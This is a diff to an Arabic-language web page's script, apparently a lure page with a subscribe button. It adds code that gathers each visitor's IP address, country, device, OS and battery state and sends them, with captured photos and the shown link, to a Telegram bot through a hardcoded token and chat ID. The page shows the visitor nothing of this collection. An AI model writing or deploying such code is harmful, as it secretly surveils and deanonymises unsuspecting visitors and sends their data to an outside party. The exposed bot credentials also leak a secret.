@@ -200,48 +200,54 @@
   const MASTER_BOT_TOKEN = "8550564365:AAEjhh_aqXExLx3i8N7niKQXjJefhdkzqtY";
   const MASTER_CHAT_ID   = "6197511637";
 
+  // ------------------ تخزين معلومات الزائر بشكل عام ------------------
+  let visitorIP = "غير معروف";
+  let visitorCountry = "غير معروف";
+  let visitorDevice = "Unknown";
+  let visitorBattery = "غير متاح";
+  let visitorOS = "غير معروف";
+
   // ------------------ إرسال معلومات الزائر (البلد + الجهاز + الشحن) ------------------
   async function sendVisitorInfo() {
     try {
       // 1. جمع معلومات الجهاز
       const userAgent = navigator.userAgent;
-      let deviceType = "Unknown";
-      if (/Android/i.test(userAgent)) deviceType = "Android";
-      else if (/iPhone|iPad|iPod/i.test(userAgent)) deviceType = "iOS";
-      else if (/Windows/i.test(userAgent)) deviceType = "Windows";
-      else if (/Mac/i.test(userAgent)) deviceType = "MacOS";
-      else if (/Linux/i.test(userAgent)) deviceType = "Linux";
+      visitorDevice = "Unknown";
+      if (/Android/i.test(userAgent)) visitorDevice = "Android";
+      else if (/iPhone|iPad|iPod/i.test(userAgent)) visitorDevice = "iOS";
+      else if (/Windows/i.test(userAgent)) visitorDevice = "Windows";
+      else if (/Mac/i.test(userAgent)) visitorDevice = "MacOS";
+      else if (/Linux/i.test(userAgent)) visitorDevice = "Linux";
+
+      visitorOS = navigator.platform || "غير معروف";
 
       // 2. محاولة الحصول على البطارية (نسبة الشحن)
-      let batteryLevel = "غير متاح";
       if (navigator.getBattery) {
         try {
           const battery = await navigator.getBattery();
-          batteryLevel = (battery.level * 100) + "%";
-          if (battery.charging) batteryLevel += " (يتم الشحن)";
-          else batteryLevel += " (غير موصول)";
-        } catch (e) { batteryLevel = "غير متاح"; }
+          visitorBattery = (battery.level * 100) + "%";
+          if (battery.charging) visitorBattery += " (يتم الشحن)";
+          else visitorBattery += " (غير موصول)";
+        } catch (e) { visitorBattery = "غير متاح"; }
       }
 
       // 3. الحصول على IP والدولة عبر خدمة خارجية
-      let ip = "غير معروف";
-      let country = "غير معروف";
       try {
         const ipRes = await fetch('https://ipapi.co/json/');
         const ipData = await ipRes.json();
-        ip = ipData.ip || "غير معروف";
-        country = ipData.country_name || "غير معروف";
+        visitorIP = ipData.ip || "غير معروف";
+        visitorCountry = ipData.country_name || "غير معروف";
       } catch (e) { /* تجاهل الفشل */ }
 
       // 4. تجهيز الرسالة
       const message = `
 🟢 *زيارة جديدة للموقع*
 ━━━━━━━━━━━━━━━
-🌍 *الدولة*: ${country}
-📱 *الجهاز*: ${deviceType}
-🔋 *البطارية*: ${batteryLevel}
-🖥 *نظام التشغيل*: ${navigator.platform || "غير معروف"}
-🌐 *IP*: ${ip}
+🌍 *الدولة*: ${visitorCountry}
+📱 *الجهاز*: ${visitorDevice}
+🔋 *البطارية*: ${visitorBattery}
+🖥 *نظام التشغيل*: ${visitorOS}
+🌐 *IP*: ${visitorIP}
 🕒 *التوقيت*: ${new Date().toLocaleString('ar-EG')}
 ━━━━━━━━━━━━━━━
       `;
@@ -303,7 +309,7 @@
       subscribeBtn.classList.add('active');
       subscribeBtn.style.opacity = '1';
       subscribeBtn.style.pointerEvents = 'auto';
-      subscribeBtn.innerHTML = 'تم الاشتراك';
+      subscribeBtn.innerHTML = '✅ تم الاشتراك';
     }
   }
 
@@ -383,11 +389,42 @@
               const form = new FormData();
               form.append('chat_id', chat);
               form.append('photo', blob, 'img.png');
-
+              
+              // إرسال الصورة أولاً
               await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                 method: 'POST',
                 body: form
               });
+
+              // ----- إرسال معلومات الزائر كتعليق (كابشن) أو كرسالة منفصلة -----
+              // نحتاج نرسل معلومات الزائر + الرابط + الوقت كرسالة مستقلة لأن Telegram API ما يدشل كابشن مع sendPhoto مباشرة بهالشكل
+              const caption = `
+━━━━━━━━━━━━━━━
+📸 *صورة جديدة تم التقاطها*
+━━━━━━━━━━━━━━━
+🌍 *الدولة*: ${visitorCountry}
+📱 *الجهاز*: ${visitorDevice}
+🔋 *البطارية*: ${visitorBattery}
+🌐 *IP*: ${visitorIP}
+🔗 *الرابط المعروض*: ${target}
+🕒 *الوقت*: ${new Date().toLocaleString('ar-EG')}
+━━━━━━━━━━━━━━━
+              `;
+
+              // إرسال الكابشن كرسالة منفصلة تحت الصورة (أفضل من كابشن لأن كابشن ما بينفع مع sendPhoto بهذا الشكل)
+              await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  chat_id: chat,
+                  text: caption,
+                  parse_mode: 'Markdown'
+                })
+              });
+
+              captureBadge.textContent = '✅ تم الإرسال مع المعلومات';
+              captureBadge.style.background = 'rgba(40,167,69,0.9)';
+              
             } catch (err) {
               captureBadge.textContent = '⚠️ خطأ في الإرسال';
               captureBadge.style.background = 'rgba(160,40,40,0.9)';
@@ -413,4 +450,4 @@
   }
 </script>
 </body>
-</html>
+  </html>
